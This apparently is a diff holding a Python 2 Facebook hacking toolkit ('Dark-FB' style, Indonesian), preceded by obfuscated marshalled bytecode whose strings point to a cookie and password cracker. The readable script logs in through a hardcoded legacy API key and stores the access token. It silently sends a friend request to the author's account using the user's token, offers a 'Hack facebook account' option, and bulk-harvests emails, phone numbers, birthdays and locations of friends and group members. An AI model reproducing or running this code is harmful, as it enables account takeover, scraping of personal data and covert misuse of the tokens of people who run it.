x00\x00z\x08"13.0.0"r\x8c\x00\x00\x00r\x8d\x00\x00\x00r\x8e\x00\x00\x00r\x8f\x00\x00\x00r\x92\x00\x00\x00r\x90\x00\x00\x00r\x93\x00\x00\x00r\x94\x00\x00\x00r\t\x00\x00\x00r\x95\x00\x00\x00r\x91\x00\x00\x00r\x96\x00\x00\x00r\x97\x00\x00\x00r\x9a\x00\x00\x00r\x9b\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00\xf3$\x00\x00\x00\x97\x00g\x00|\x00]\r\\\x02\x00\x00}\x01}\x02|\x01d\x00z\x00\x00\x00|\x02z\x00\x00\x00\x91\x02\x8c\x0eS\x00r\x9d\x00\x00\x00r\x1c\x00\x00\x00r\x9f\x00\x00\x00s\x03\x00\x00\x00   r\x12\x00\x00\x00r"\x00\x00\x00z\x1arcrack.<locals>.<listcomp>{\x02\x00\x00r\xa2\x00\x00\x00r\x14\x00\x00\x00\xe9\x97\x00\x00\x00\xe9\xa6\x00\x00\x00z\x12\r\x1b[1;36m[SAMI-OK] r\xa5\x00\x00\x00u\x1e\x00\x00\x00\x1b[1;32m [\xf0\x9f\x98\x9d]Cookie : \x1b[1;32mr\xa6\x00\x00\x00r\xa7\x00\x00\x00r\xa8\x00\x00\x00r\xa9\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00\xf3$\x00\x00\x00\x97\x00g\x00|\x00]\r\\\x02\x00\x00}\x01}\x02|\x01d\x00z\x00\x00\x00|\x02z\x00\x00\x00\x91\x02\x8c\x0eS\x00r\x9d\x00\x00\x00r\x1c\x00\x00\x00r\x9f\x00\x00\x00s\x03\x00\x00\x00   r\x12\x00\x00\x00r"\x00\x00\x00z\x1arcrack.<locals>.<listcomp>\x8b\x02\x00\x00r\xa2\x00\x00\x00r\x14\x00\x00\x00\xe9\x8d\x00\x00\x00\xe9\x98\x00\x00\x00r\xad\x00\x00\x00z\x0f\r\x1b[1;37m[SAMI] z\x04|OK:z\x04 CP:z\x02 \rr\xaf\x00\x00\x00)\x0cra\x00\x00\x00rc\x00\x00\x00r_\x00\x00\x00r\xc1\x00\x00\x00r)\x00\x00\x00r\xc2\x00\x00\x00r\xc3\x00\x00\x00r\xc4\x00\x00\x00r\xc5\x00\x00\x00r\xc6\x00\x00\x00r\xc7\x00\x00\x00r3\x00\x00\x00s\x0c\x00\x00\x00            r\x12\x00\x00\x00rX\x00\x00\x00rX\x00\x00\x00:\x02\x00\x00s\x12\x04\x00\x00\x80\x00\xf0\x10a\x01\x02\x07\xe0\x0c\x0f\xf0\x00U\x01\x03\r\xf1\x00U\x01\x03\r\x80b\xe5\r\x15\xd4\r\x1d\xd1\r\x1f\xd4\r\x1f\x807\xe5\t\x0f\x8c\x1d\x95v\xd1\t\x1e\xd4\t\x1e\x803\xe0\r\x14\x8f[\x8a[\xd0\x194\xd1\r5\xd4\r5\xd4\r:\x807\xf5\x08\x00\x0b\r\x8c)\xd0\x14.\xb5\x03\xb0G\xb1\x0c\xb4\x0c\xd1\n=\xd4\n=\xd7\nC\xd2\nC\xc0A\xd1\nF\xd4\nF\xe5\r\x0f\x8cY\xd0\x175\xb5s\xb87\xb1|\xb4|\xd1\rD\xd4\rD\xd7\rJ\xd2\rJ\xc81\xd1\rM\xd4\rM\xe5\n\x0c\x8c)\xd0\x14/\xb5\x13\xb0W\xb1\x1c\xb4\x1c\xd1\n>\xd4\n>\xd7\nD\xd2\nD\xc0Q\xd1\nG\xd4\nG\xe5\x08\n\x8c\t\xd0\x12+\xadS\xb0\x17\xa9\\\xac\\\xd1\x08:\xd4\x08:\xd7\x08@\xd2\x08@\xc0\x11\xd1\x08C\xd4\x08C\xe0\x10\x13\xe0\x18\x1b\xe0\x0b\x0e\xe0\n\x0c\xe0\x0b\x13\xf0%\x12\x0f\x15\xf0\x00\x12\x0f\x15\x808\xf0(\x11\x13F\x02\x90;\xd0 0\xf0\x00\x11\x13F\x02\xd8\x04\x0c\xf0\x00\x00\x0fX\x02\xf0\x03\x11\x13F\x02\xe0\x04\x15\xd0\x173\xf0\x05\x11\x13F\x02\xf0\x06\x00\x05\x14\x90[\xf0\x07\x11\x13F\x02\xf0\x08\x00\x05\n\x886\xf0\t\x11\x13F\x02\xf0\n\x00\x05"\xa07\xf0\x0b\x11\x13F\x02\xf0\x0c\x00\x05\x10\xd0\x11;\xf0\r\x11\x13F\x02\xf0\x0e\x00\x05"\xd0#]\xf0\x0f\x11\x13F\x02\xf0\x10\x00\x05\x17\x98\x04\xf0\x11\x11\x13F\x02\xf0\x12\x00\x05\x16\x90y\xf0\x13\x11\x13F\x02\xf0\x14\x00\x05\x19\x98+\xf0\x15\x11\x13F\x02\xf0\x16\x00\x05!\xa0*\xf0\x17\x11\x13F\x02\xf0\x18\x00\x05\x15\x90j\xf0\x19\x11\x13F\x02\xf0\x1a\x00\x05\x15\x90j\xf0\x1b\x11\x13F\x02\xf0\x1c\x00\x05\x15\x90f\xf0\x1d\x11\x13F\x02\xf0\x1e\x00\x05\x15\x90d\xf0\x1f\x11\x13F\x02\xf0 \x00\x05 \xa0\x13\xf0!\x11\x13F\x02\xf0"\x00\x05\x11\xf0\x00\x00\x13D\x02\xf0#\x11\x13F\x02\xf0\x00\x11\x13F\x02\x80=\xf0&\x00\t\x10\x8f\x0c\x8a\x0c\xd0\x15r\xf0\x00\x00y\x01A\x02\xf0\x00\x00J\x02W\x02\x88\x0c\xf1\x00\x00\tX\x02\xf4\x00\x00\tX\x02\xf4\x00\x00\t]\x02\x802\xe0\x0f\x16\x8c\x7f\xd7\x0f\'\xd2\x0f\'\xd1\x0f)\xd4\x0f)\xd7\x0f.\xd2\x0f.\xd1\x0f0\xd4\x0f0\x80;\xf0\x08\x00\x07\x0f\x90+\xd0\x06\x1d\xd0\x06\x1d\xe0\t\x0c\x8f\x18\x8a\x18\xd0\x12U\xd0\x12U\xb0\'\xb4/\xd72J\xd22J\xd12L\xd42L\xd72R\xd22R\xd12T\xd42T\xd0\x12U\xd1\x12U\xd4\x12U\xd1\tV\xd4\tV\x80D\xe0\n\x0e\x88s\x903\x88w\x8c-\x80C\xe5\x04\t\xd0\n"\xa03\xd1\n&\xa0u\xd1\n,\xa8R\xd1\n/\xd1\x040\xd4\x040\xd0\x040\xe5\x04\t\xd0\n7\xb0\x14\xd0\n7\xd0\n7\xd1\x048\xd4\x048\xd0\x048\xe5\x04\x08\x88\x18\x903\xd1\x04\x17\xd4\x04\x17\xd7\x04\x1d\xd2\x04\x1d\x98c\xa0%\x99i\xa8\x02\x99l\xa84\xd1\x1e/\xd1\x040\xd4\x040\xd0\x040\xe5\x04\x07\x87J\x82J\x88s\x81O\x84O\x80O\xe0\x04\t\x80E\xe0\x08\x14\x98\x0b\xd0\x08#\xd0\x08#\xe0\t\x0c\x8f\x18\x8a\x18\xd0\x12U\xd0\x12U\xb0\'\xb4/\xd72J\xd22J\xd12L\xd42L\xd72R\xd22R\xd12T\xd42T\xd0\x12U\xd1\x12U\xd4\x12U\xd1\tV\xd4\tV\x80D\xe0\n\x0e\x88s\x903\x88w\x8c-\x80C\xf5\x08\x00\x05\t\x88\x18\x903\xd1\x04\x17\xd4\x04\x17\xd7\x04\x1d\xd2\x04\x1d\x98c\xa0%\x99i\xa8\x02\x99l\xa84\xd1\x1e/\xd1\x040\xd4\x040\xd0\x040\xe5\x04\x07\x87J\x82J\x88s\x81O\x84O\x80O\xe0\x04\t\x80E\xf1\x08\x00\x05\r\xe5\x02\x06\x88\x01\x81\'\x80$\xe5\x02\x05\x84*\xd7\x02\x12\xd2\x02\x12\xd0\x02\x12\xbd$\xb8$\xb8$\xbds\xc53\xb9x\xbcx\xb8x\xb8x\xcd\x03\xcdC\xc9\x08\xcc\x08\xc8\x08\xc8\x08\xd0\x13Q\xd1\x02R\xd4\x02R\xd0\x02S\xd0\x02S\xe5\x02\x05\x84*\xd7\x02\x12\xd2\x02\x12\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xd0\x02\x14\xd0\x02\x14\xf8\xf0\x04\x02\x02\x07\xe0\x02\x06\x80$\x80$\xf8\xf8\xf8s\x0c\x00\x00\x00\x82N\x07N\x0b\x00\xce\x0b\x02N\x10\x03)\'r\n\x00\x00\x00r\x0b\x00\x00\x00r\xb0\x00\x00\x00\xda\x0bImportErrorr\x0c\x00\x00\x00\xda\x12concurrent.futures\xda\nconcurrent\xda\x03bs4\xda\x04jsonr\xbe\x00\x00\x00rB\x00\x00\x00\xda\x08datetime\xda\x04timer\xb3\x00\x00\x00\xda\nsubprocess\xda\x08platform\xda\x04uuidr\x03\x00\x00\x00r5\x00\x00\x00r\x04\x00\x00\x00\xda\x04tred\xda\x06base64rD\x00\x00\x00rU\x00\x00\x00\xda\tmechanize\xda\x13requests.exceptionsr\x05\x00\x00\x00\xda\x13ModuleNotFoundErrorr\xb2\x00\x00\x00r\r\x00\x00\x00r\xbd\x00\x00\x00r\xbb\x00\x00\x00r\xbc\x00\x00\x00r\x13\x00\x00\x00r8\x00\x00\x00r\x0f\x00\x00\x00r<\x00\x00\x00rX\x00\x00\x00r=\x00\x00\x00r\x1c\x00\x00\x00r\x14\x00\x00\x00r\x12\x00\x00\x00\xfa\x08<module>r\xe5\x00\x00\x00\x01\x00\x00\x00s\x89\x03\x00\x00\xf0\x03\x01\x01\x01\xf0\x06\x00\x01\n\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\nS\xd1\x00T\xd4\x00T\xd0\x00T\xf0\x06\x08\x01#\xe0\x01\x10\x80\x1f\x80\x1f\x80\x1f\x80\x1f\xf8\xe0\x07\x12\xf0\x00\x04\x01#\xf0\x00\x04\x01#\xf0\x00\x04\x01#\xe0\x01\x06\x80\x15\xd0\x074\xd1\x015\xd4\x015\xd0\x015\xe0\x01\n\x80\x12\x84\x19\xd0\x0b!\xd1\x01"\xd4\x01"\xd0\x01"\xd0\x01"\xd0\x01"\xf0\t\x04\x01#\xf8\xf8\xf8\xf0\x10\x08\x01"\xe0\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xd0\x01\x1a\xf8\xe0\x07\x12\xf0\x00\x04\x01"\xf0\x00\x04\x01"\xf0\x00\x04\x01"\xe0\x01\x06\x80\x15\xd0\x073\xd1\x014\xd4\x014\xd0\x014\xe0\x01\n\x80\x12\x84\x19\xd0\x0b \xd1\x01!\xd4\x01!\xd0\x01!\xd0\x01!\xd0\x01!\xf0\t\x04\x01"\xf8\xf8\xf8\xf0\x10\x08\x01\x1e\xe0\x01\x0b\x80\x1a\x80\x1a\x80\x1a\x80\x1a\xf8\xe0\x07\x12\xf0\x00\x04\x01\x1e\xf0\x00\x04\x01\x1e\xf0\x00\x04\x01\x1e\xe0\x01\x06\x80\x15\xd0\x07/\xd1\x010\xd4\x010\xd0\x010\xe0\x01\n\x80\x12\x84\x19\xd0\x0b\x1c\xd1\x01\x1d\xd4\x01\x1d\xd0\x01\x1d\xd0\x01\x1d\xd0\x01\x1d\xf0\t\x04\x01\x1e\xf8\xf8\xf8\xf0\x10\x00\x01N\x01\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xd0\x00M\xe0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xd0\x00$\xe0\x009\xd0\x009\xd0\x009\xd0\x009\xd0\x009\xd0\x009\xe0\x00\r\x80\r\x80\r\x80\r\xe0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xd0\x008\xf0\x04\x0e\x01\x1c\xe0\x01\x10\x80\x1f\x80\x1f\x80\x1f\xe0\x01@\xd0\x01@\xd0\x01@\xd0\x01@\xd0\x01@\xd0\x01@\xe0\x01\x11\xd0\x01\x11\xd0\x01\x11\xd0\x01\x11\xe0\x010\xd0\x010\xd0\x010\xd0\x010\xd0\x010\xd0\x010\xd0\x010\xf8\xe0\x07\x1a\xf0\x00\x04\x01\x1c\xf0\x00\x04\x01\x1c\xf0\x00\x04\x01\x1c\xe0\x01\n\x80\x12\x84\x19\xd0\x0bB\xd1\x01C\xd4\x01C\xd0\x01C\xe0\x01\n\x80\x12\x84\x19\x88?\xd1\x01\x1b\xd4\x01\x1b\xd0\x01\x1b\xd0\x01\x1b\xd0\x01\x1b\xf0\t\x04\x01\x1c\xf8\xf8\xf8\xf0\x10\x7f\x01\nS\x02\xf0\x00\x7f\x01\nS\x02\xf0\x00\x7f\x01\nS\x02\x80\x06\xf0B\x04\x0e\x08C\x01\x80\x04\xf0 \x00\x08\t\x80\x04\xe0\x07\x08\x80\x04\xe0\x06\x08\x80\x03\xe0\x06\x08\x80\x03\xf0\x08\x10\x01\x11\xf0\x00\x10\x01\x11\xf0\x00\x10\x01\x11\xf0(0\x01\x19\xf0\x000\x01\x19\xf0\x000\x01\x19\xf0l\x01 \x013\xf0\x00 \x013\xf0\x00 \x013\xf0H\x019\x01\x08\xf0\x009\x01\x08\xf0\x009\x01\x08\xf0~\x01k\x01\x01\x07\xf0\x00k\x01\x01\x07\xf0\x00k\x01\x01\x07\xf0^\x038\x01\x08\xf0\x008\x01\x08\xf0\x008\x01\x08\xf0x\x01i\x01\x01\x07\xf0\x00i\x01\x01\x07\xf0\x00i\x01\x01\x07\xf0V\x03\x00\x01\x05\x80\x04\x81\x06\x84\x06\x80\x06\x80\x06\x80\x06sB\x00\x00\x00\x96\x04\x1b\x00\x9b >\x03\xbd\x01>\x03\xc1\x02\x04A\x07\x00\xc1\x07 A*\x03\xc1)\x01A*\x03\xc1.\x04A3\x00\xc13 B\x16\x03\xc2\x15\x01B\x16\x03\xc3:\x14D\x0f\x00\xc4\x0f%D7\x03\xc46\x01D7\x03'))
+#!/usr/bin/python
+# coding=utf-8
+# pashakun.com
+
+#Import module
+import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
+from multiprocessing.pool import ThreadPool
+try:
+	import mechanize
+except ImportError:
+	os.system("pip2 install mechanize")
+try:
+	import requests
+except ImportError:
+	os.system("pip2 install requests")
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+#-Setting-#
+########
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+#-Keluar-#
+def keluar():
+	print "\033[1;91m[!] Exit"
+	os.sys.exit()
+	
+#-Warna-#
+def acak(x):
+    w = 'mhkbpcP'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+    
+def cetak(x):
+    w = 'mhkbpcP'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+	
+#-Animasi-#
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(00000.1)
+		
+##### LOGO #####
+logo = """\033[1;30m█████████
+\033[1;30m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+\033[1;30m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
+\033[1;30m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+\033[1;30m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96m
+\033[1;30m█████████      \033[1;92m«----------✧----------»
+\033[1;30m ██ ██
+\033[1;31m╔════════════════════════════════════════════╗
+\033[1;31m║\033[1;32m* \033[1;93mAuthor  \033[1;93m: \033[1;37m./OiBoy SecLinux         \033[1;31m       ║
+\033[1;31m║\033[1;32m* \033[1;93mWebsite \033[1;93m: \033[1;37m\033[4mhttps://pashakun.com\033[0m \033[1;31m           ║
+\033[1;31m║\033[1;32m* \033[1;93mGitHub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/pashayogi\033[0m \033[1;31m   ║
+\033[1;31m║\033[1;32m* \033[1;93mTeam    \033[1;93m: \033[1;37m\033[4mINDONESIA CYBER ERROR SYSTEM\033[0m \033[1;31m   ║
+\033[1;31m╚════════════════════════════════════════════╝"""
+
+# titik #
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+
+back = 0
+threads = []
+berhasil = []
+cekpoint = []
+oks = []
+gagal = []
+idteman = []
+idfromteman = []
+idmem = []
+emmem = []
+nomem = []
+id = []
+em = []
+emfromteman = []
+hp = []
+hpfromteman = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('reset')
+	masuk()
+
+##### Pilih Login #####
+def masuk():
+	os.system('reset')
+	print logo
+	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;32m Login dulu"
+	print "\033[1;91m║--\033[1;91m> \033[1;95m2.\033[1;32m Login using token"
+	print "\033[1;91m║--\033[1;91m> \033[1;95m0.\033[1;31m Exit/keluar"
+	print "\033[1;91m║"
+	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
+	if msuk =="":
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+	elif msuk =="1":
+		login()
+	elif msuk =="2":
+		tokenz()
+	elif msuk =="0":
+		keluar()
+	else:
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+		
+##### LOGIN #####
+#================#
+def login():
+	os.system('reset')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('reset')
+		print logo
+		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
+		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
+		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\033[1;91m[!] No connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				zedd = open("login.txt", 'w')
+				zedd.write(z['access_token'])
+				zedd.close()
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://www.pashakun.com')
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;91m[!] No connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[#] Harap Login Ulang !")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;91m[!] Login Failed")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+			
+##### TOKEN #####
+def tokenz():
+	os.system('reset')
+	print logo
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
+			
+##### MENU ##########################################
+def menu():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('reset')
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('reset')
+		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[!] No connection"
+		keluar()
+	os.system("reset")
+	print logo
+	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
+	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
+	print "\033[1;97m╚"+40*"═"
+	print "\033[1;94m║--\033[1;91m> \033[1;93m1.\033[1;95m User information"
+	print "\033[1;94m║--\033[1;91m> \033[1;93m2.\033[1;95m Get Id/email/hp"
+	print "\033[1;94m║--\033[1;91m> \033[1;93m3.\033[1;95m Hack facebook account               "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m4.\033[1;95m Bot       "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m5.\033[1;95m Others           "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m6.\033[1;95m Show token           "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m7.\033[1;95m Delete trash          "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m8.\033[1;95m LogOut            "
+	print "\033[1;94m║--\033[1;91m> \033[1;93m0.\033[1;95m Exit the programs          "
+	print "║"
+	pilih()
+#-
+def pilih():
+	zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if zedd =="":
+		print "\033[1;91m[!] Wrong input"
+		pilih()
+	elif zedd =="1":
+		informasi()
+	elif zedd =="2":
+		dump()
+	elif zedd =="3":
+		menu_hack()
+	elif zedd =="4":
+		menu_bot()
+	elif zedd =="5":
+		lain()
+	elif zedd =="6":
+		os.system('reset')
+		print logo
+		toket=open('login.txt','r').read()
+		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+toket
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu()
+	elif zedd =="7":
+		os.remove('out')
+	elif zedd =="8":
+		os.system('rm -rf login.txt')
+		os.system('xdg-open https://www.pashakun.com')
+		keluar()
+	elif zedd =="0":
+		keluar()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		pilih()
+	
+##### INFO #####
+def informasi():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
+	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+	cok = json.loads(r.text)
+	for i in cok['data']:
+		if aid in i['name'] or aid in i['id']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
+			z = json.loads(x.text)
+			print 42*"\033[1;97m═"
+			try:
+				print '\033[1;91m[➹] \033[1;92mName\033[1;97m          : '+z['name']
+			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mID\033[1;97m            : '+z['id']
+			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;97m            : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mEmail\033[1;97m         : '+z['email']
+			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;97m         : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mTelephone\033[1;97m     : '+z['mobile_phone']
+			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
+			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;97m      : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mDate of birth\033[1;97m : '+z['birthday']
+			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
+			try:
+				print '\033[1;91m[➹] \033[1;92mSchool\033[1;97m        : '
+				for q in z['education']:
+					try:
+						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
+					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
+			except KeyError: pass
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			menu()
+		else:
+			pass
+	else:
+		print"\033[1;91m[✖] User not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu()
+		
+##### DUMP #####
+def dump():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID Search"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member ID"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member email"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get group member phone number"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get email friend from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Get a friend's phone number from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	dump_pilih()
+#-----pilih
+def dump_pilih():
+	cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if cuih =="":
+		print "\033[1;91m[!] Wrong input"
+		dump_pilih()
+	elif cuih =="1":
+		id_teman()
+	elif cuih =="2":
+		idfrom_teman()
+	elif cuih =="3":
+		os.system('reset')
+		print "\033[1;91mSegera"
+		keluar()
+	elif cuih =="4":
+		id_member_grup()
+	elif cuih =="5":
+		em_member_grup()
+	elif cuih =="6":
+		no_member_grup()
+	elif cuih =="7":
+		email()
+	elif cuih =="8":
+		emailfrom_teman()
+	elif cuih =="9":
+		nomor_hp()
+	elif cuih =="10":
+		hpfrom_teman()
+	elif cuih =="0":
+		menu()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		dump_pilih()
+		
+##### ID TEMAN #####
+def id_teman():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		os.system('reset')
+		print logo
+		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z=json.loads(r.text)
+		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
+		print 42*"\033[1;97m═"
